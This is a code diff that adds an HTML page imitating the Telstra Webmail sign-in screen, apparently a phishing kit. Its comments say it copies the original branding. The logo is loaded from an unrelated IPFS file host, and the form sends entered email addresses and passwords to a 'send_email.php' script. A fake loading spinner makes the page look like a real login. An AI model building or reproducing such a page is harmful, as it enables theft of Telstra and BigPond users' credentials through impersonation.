@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telstra Webmail Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif; /* Approximation; Telstra uses a custom font */
+            background-color: #e6f0fa; /* Light blue background from images */
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+        .logo {
+            margin-bottom: 20px; /* Increased spacing to match original */
+        }
+        .logo img {
+            max-width: 100%; /* Ensure logo scales responsively */
+            height: auto;
+        }
+        h1 {
+            color: #1a0dab; /* Dark blue from original */
+            font-size: 1.8rem; /* Larger to match emphasis in original */
+            font-weight: bold; /* Bold styling as seen */
+            margin-bottom: 10px;
+            line-height: 1.2; /* Tighten line height for modern look */
+			
+        }
+        .subtext {
+            color: #333; /* Dark gray for subtext */
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #1e90ff;
+            border-radius: 8px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        .forgot, .recover {
+            text-align: left;
+            color: #1e90ff;
+            text-decoration: underline;
+            font-size: 0.85rem;
+            margin: 10px 0;
+            display: inline-block;
+        }
+        .show-password {
+            color: #1e90ff;
+            text-decoration: underline;
+            font-size: 0.85rem;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1e90ff;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 15px;
+            min-height: 50px;
+        }
+        .button:hover {
+            background-color: #104e8b;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1e90ff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: green;
+            display: none;
+        }
+        .error {
+            color: red;
+        }
+
+        /* Media Queries */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.5rem; /* Adjust for smaller screens */
+            }
+            .subtext {
+                font-size: 0.8rem;
+            }
+            .input-field {
+                padding: 10px;
+                font-size: 0.9rem;
+            }
+            .button {
+                font-size: 0.9rem;
+                padding: 10px;
+            }
+            .forgot, .recover, .show-password {
+                font-size: 0.75rem;
+            }
+        }
+
+        @media (min-width: 481px) and (max-width: 768px) {
+            .container {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo"><img src="https://protestant-black-jackal.myfilebase.com/ipfs/QmejRKMSd1j5pAT3eWmcwjofjqWBAvxzV8xT8au4Vbo8it" alt="logo" style="width:50px; height:auto;"</div> <!-- Use the uploaded logo -->
+        </div>
+        <h1>Sign in to Telstra <p>webmail</p></h1>
+        <p class="subtext">Sign in with your Telstra email address</p>
+        <form action="send_email.php" method="POST" id="loginForm">
+            <p>Back to previous for: <input type="email" name="email" class="input-field" placeholder="john.a@bigpond.com" ></p>
+            <label for="password"></label>
+            <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
+            <span class="show-password" onclick="togglePassword()">Show</span>
+            <a href="#" class="recover">Recover account</a>
+            <button type="submit" class="button" id="signInBtn">Sign in</button>
+        </form>
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const showSpan = event.target;
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                showSpan.textContent = 'Hide';
+            } else {
+                passwordField.type = 'password';
+                showSpan.textContent = 'Show';
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            const loader = document.getElementById('loader');
+            const button = document.getElementById('signInBtn');
+            loader.style.display = 'block';
+            button.disabled = true;
+            setTimeout(() => {
+                loader.style.display = 'none';
+                button.disabled = false;
+            }, 2000); // Simulate loading
+        });
+    </script>
+</body>
+</html>
